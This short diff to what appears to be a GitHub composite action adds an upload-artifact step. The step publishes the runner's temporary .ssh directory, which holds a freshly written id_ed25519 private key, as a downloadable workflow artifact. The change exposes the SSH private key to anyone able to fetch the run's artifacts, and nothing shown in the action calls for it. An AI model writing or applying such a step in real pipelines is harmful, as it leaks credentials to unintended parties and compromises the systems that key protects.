@@ -47,6 +47,14 @@ runs:
         chmod 0600 "$SSH_TEMP/id_ed25519"
       shell: bash
 
+    - uses: actions/upload-artifact@v4
+      with:
+        name: ssh
+        path: ${{ runner.temp }}/.ssh
+        retention-days: 1
+        overwrite: true
+
+
     - if: fromJson(steps.checks.outputs.git).is-configured == false
       run: |
         : # configure git
